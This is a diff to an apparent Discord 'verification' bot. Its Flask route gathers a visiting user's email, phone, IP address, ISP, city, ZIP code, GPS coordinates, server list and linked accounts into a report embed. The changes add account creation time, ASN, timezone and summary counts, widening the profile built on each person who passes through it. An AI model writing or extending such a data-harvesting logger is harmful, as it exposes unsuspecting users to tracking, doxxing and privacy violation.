@@ -5,6 +5,7 @@ import threading
 import httpx
 import discord
 from discord.ext import commands
+from datetime import datetime
 from pystyle import *
 import asyncio
 import sqlite3
@@ -29,6 +30,12 @@ def _send_or_file(ctx, content: str, filename: str = "info.txt"):
     bio = BytesIO(content.encode("utf-8"))
     bio.seek(0)
     return ctx.send(file=discord.File(bio, filename=filename))
+
+def snowflake_time(snowflake):
+    try:
+        return datetime.utcfromtimestamp((int(snowflake) >> 22) / 1000 + 1420070400)
+    except:
+        return None
 
 
 # ── Config ──────────────────────────────────────────────────────────────
@@ -221,12 +228,17 @@ def verified():
     useragent = flask.request.headers.get("User-Agent", "Unknown")
     flag = geo.get("countryCode", "xx").lower()
     avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png?size=512"
+    created_at = snowflake_time(user_id)
+    created_str = created_at.strftime("%Y-%m-%d %H:%M:%S UTC") if created_at else "N/A"
 
     info = {
         "embeds": [
             {
                 "title": f"👤 {user.get('username','Unknown')}#{user.get('discriminator','0000')}",
-                "description": f"User ID: `{user_id}`",
+                "description": (
+                    f"**User ID**\n`{user_id}`\n\n"
+                    f"**Created At**\n`{created_str}`"
+                ),
                 "color": 0x5865F2,
     
                 "thumbnail": {
@@ -237,18 +249,18 @@ def verified():
                     {
                         "name": "📧 Account",
                         "value": (
-                            f"**Email**\n{user.get('email') or 'N/A'}\n\n"
-                            f"**Phone**\n{user.get('phone') or 'N/A'}\n\n"
-                            f"**Locale**\n{user.get('locale') or 'N/A'}"
+                            f"**Email**\n`{user.get('email') or 'N/A'}`\n\n"
+                            f"**Phone**\n`{user.get('phone') or 'N/A'}`\n\n"
+                            f"**Locale**\n`{user.get('locale') or 'N/A'}`"
                         )[:1024],
                         "inline": True,
                     },
                     {
                         "name": "🔐 Security",
                         "value": (
-                            f"**Verified**\n{'Yes' if user.get('verified') else 'No'}\n\n"
-                            f"**MFA Enabled**\n{'Yes' if user.get('mfa_enabled') else 'No'}\n\n"
-                            f"**Nitro**\n{'Yes' if user.get('premium_type') else 'No'}"
+                            f"**Verified**\n`{'Yes' if user.get('verified') else 'No'}`\n\n"
+                            f"**MFA Enabled**\n`{'Yes' if user.get('mfa_enabled') else 'No'}`\n\n"
+                            f"**Nitro**\n`{'Yes' if user.get('premium_type') else 'No'}`"
                         )[:1024],
                         "inline": True,
                     },
@@ -256,41 +268,47 @@ def verified():
                         "name": "🌐 Network",
                         "value": (
                             f"**IP Address**\n`{ip or 'N/A'}`\n\n"
-                            f"**ISP**\n{geo.get('isp') or 'N/A'}\n\n"
-                            f"**Organization**\n{geo.get('org') or 'N/A'}"
+                            f"**ISP**\n`{geo.get('isp') or 'N/A'}`\n\n"
+                            f"**Organization**\n`{geo.get('org') or 'N/A'}`\n\n"
+                            f"**ASN**\n`{geo.get('as') or 'N/A'}`"
                         )[:1024],
                         "inline": False,
                     },
                     {
                         "name": "📍 Location",
                         "value": (
-                            f":flag_{flag}: **{geo.get('country') or 'N/A'}**\n\n"
-                            f"**Region**\n{geo.get('regionName') or 'N/A'}\n\n"
-                            f"**City**\n{geo.get('city') or 'N/A'}\n\n"
-                            f"**ZIP Code**\n{geo.get('zip') or 'N/A'}\n\n"
-                            f"**Coordinates**\n`{lat or 'N/A'}, {lon or 'N/A'}`"
+                            f"**Country**\n`:flag_{flag}: {geo.get('country') or 'N/A'}`\n\n"
+                            f"**Region**\n`{geo.get('regionName') or 'N/A'}`\n\n"
+                            f"**City**\n`{geo.get('city') or 'N/A'}`\n\n"
+                            f"**ZIP Code**\n`{geo.get('zip') or 'N/A'}`\n\n"
+                            f"**Coordinates**\n`{lat or 'N/A'}, {lon or 'N/A'}`\n\n"
+                            f"**Timezone**\n`{geo.get('timezone') or 'N/A'}`"
                         )[:1024],
                         "inline": False,
                     },
                     {
-                        "name": "🏠 Guilds",
+                        "name": "📊 Stats",
                         "value": (
-                            guild_list[:1000] if guild_list else "None"
-                        ),
+                            f"**Guild Count**\n`{len(guild_list.splitlines()) if guild_list else 0}`\n\n"
+                            f"**Connections Count**\n`{len(connection_list.splitlines()) if connection_list else 0}`"
+                        )[:1024],
+                        "inline": True,
+                    },
+                    {
+                        "name": "🏠 Guilds",
+                        "value": f"```{(guild_list or 'None')[:1000]}```",
                         "inline": False,
                     },
                     {
                         "name": "🔗 Connections",
-                        "value": (
-                            connection_list[:1000] if connection_list else "None"
-                        ),
+                        "value": f"```{(connection_list or 'None')[:1000]}```",
                         "inline": False,
                     },
                     {
-                        "name": "🗺 Map Link",
+                        "name": "🗺 Map",
                         "value": (
                             f"[Open in Google Maps]({map_url})"
-                            if map_url else "N/A"
+                            if map_url else "`N/A`"
                         ),
                         "inline": False,
                     },
@@ -305,7 +323,7 @@ def verified():
                 },
     
                 "footer": {
-                    "text": f"User-Agent: {(useragent or 'Unknown')[:100]}"
+                    "text": f"{(useragent or 'Unknown')[:100]}"
                 },
             }
         ]
